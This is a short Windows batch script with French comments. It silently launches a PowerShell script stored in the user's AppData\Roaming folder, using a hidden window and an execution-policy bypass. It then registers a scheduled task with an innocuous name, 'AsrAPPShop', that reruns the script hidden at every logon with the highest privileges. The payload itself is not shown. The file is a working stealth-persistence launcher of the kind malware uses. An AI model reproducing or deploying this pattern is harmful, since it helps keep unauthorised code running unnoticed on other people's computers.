@echo off
REM 1. Lancement immédiat du script
start /min powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%USERPROFILE%\AppData\Roaming\c.ps1"

REM 2. Création de la tâche avec un chemin résolu dynamiquement par PowerShell
powershell -Command "$p = Join-Path$env:userprofile 'AppData\Roaming\c.ps1'; Schtasks /Create /TN 'AsrAPPShop' /TR \"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `\"$p`\"\" /SC ONLOGON /RL HIGHEST /F"
